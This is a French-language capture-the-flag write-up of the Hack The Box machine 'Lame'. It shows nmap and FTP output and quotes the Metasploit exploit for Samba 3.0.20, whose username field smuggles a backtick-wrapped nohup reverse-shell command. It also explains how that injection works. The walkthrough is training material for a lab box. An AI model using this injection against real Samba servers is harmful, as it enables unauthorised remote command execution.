# Lame

COmme d'ahabitude, on commence par ping la boxe et faire un nmap :

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-21 10:21 EDT
Nmap scan report for 10.10.10.3
Host is up (0.024s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.16.3
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2022-07-21T10:23:28-04:00
|_clock-skew: mean: 2h01m19s, deviation: 2h49m43s, median: 1m18s
```
Nous avons :

- un service ftp via vsftpd 2.3.4
- deux ports samba 3.0.20
- un service ssh via Openssh OpenSSH 4.7p


ftp est le protocole de transfert de fichier, tandis que ssh est le secure shell (ie, ce avec quoi on peut utiliser pour se connecter àa la machine), et samba est un protocole qui permet une interopérabilité entre windows et linux.

Avant de chercher des vulnérabilités, je vaus essayer de me connecter au serveur ftp, car je sais qu'on peut laisser les "anon" se connecter.

"anon" n'est pas le nouveau groupe de grey hat qui font peur aux 200, mais le gentil nom donné aux personnes qui se connectent de façon anonyme (sna sle user + mdp set pour le serveur ftp).

Essayons ! 

```sh
ftp 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:kali): anonymous
331 Please specify the password.
Password: // anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```
Hem.

Regardons donc ce qu'il y a dedans :

```
ftp> ls
229 Entering Extended Passive Mode (|||23130|).
150 Here comes the directory listing.
226 Directory send OK.
```

Il n'y a rien, en tout cas rien que nous pouvons apriori exploiter.

Passons donc aux vulénrabilités.

En regardant cherchant avec searchsploit, on voit que cette version semble vulnérable à une backdoor command execution.

Seulement, cet exploit ne semble pas fonctionner sur cette version, pour une raison ou pour une autre (la version, ou un port non ouvert ?, non persistence du revshell).

Par contre, en faisant la même recherche avec la version de samba, on tombe sur plusieurs vulnérabilités :

```sh
xploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                                                                                                                    | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                                                                                                          | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                                                                                                                                                     | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                                                                                                             | linux_x86/dos/36741.py
```

Celle qui va nous intéresser est la deuxième de la liste (les trois autres n'ayant pas d'intérêt dans le cadre de ce pentest).

Si on regarde comment l'exploit est écrit sur metasploit :

```ruby

	def exploit

		connect

		# lol?
		username = "/=`nohup " + payload.encoded + "`"
		begin
			simple.client.negotiate(false)
			simple.client.session_setup_ntlmv1(username, rand_text(16), datastore['SMBDomain'], false)
		rescue ::Timeout::Error, XCEPT::LoginError
			# nothing, it either worked or it didn't ;)
		end

		handler
	end
  ```
  
  On se rend compte qu'il s'agit de faire persister un rev shell via la command "nohup". Ce qui est entre les backticks, à l'instar de ce qui est entre "$()" est exécuté par une sorte de shell secondaire.
  
  La commande nohup est là pour faire persister ce processus jusqu'à ce qu'il se termine en bloquant le signal SIGHUP qui sinon mettrait un terme au dit processus.
  
Il existe aussi des versions python de cet exploit.

Mais il faut installer des modules dont je n'aurais apriori pas l'utilité de si tôt alors, une fois n'est pas coutume, après avoir bien saisi cet exploit, utilisons metasploit.

C'est extrêmement simple, et visualisable en deux images :

![lame1](https://github.com/0xbatche/HTB/blob/fac15d0943a2451e702c0ca2f3c02a0b420cdd0d/boxes/imgs/lame1.PNG)
![lame2](https://github.com/0xbatche/HTB/blob/fac15d0943a2451e702c0ca2f3c02a0b420cdd0d/boxes/imgs/lame2.PNG)

Et voilà !

## Conclusion :

Une boxe sympa qui permet de découvrir les bases d'un pentest. Si par rapport à d'autres easy box (notamment les dernières à l'heure où j'écris, RedPanda et Opensource) elle est d'un abord extrêmement simple, il reste que pour débuter c'est un très bon exercice.





  
  

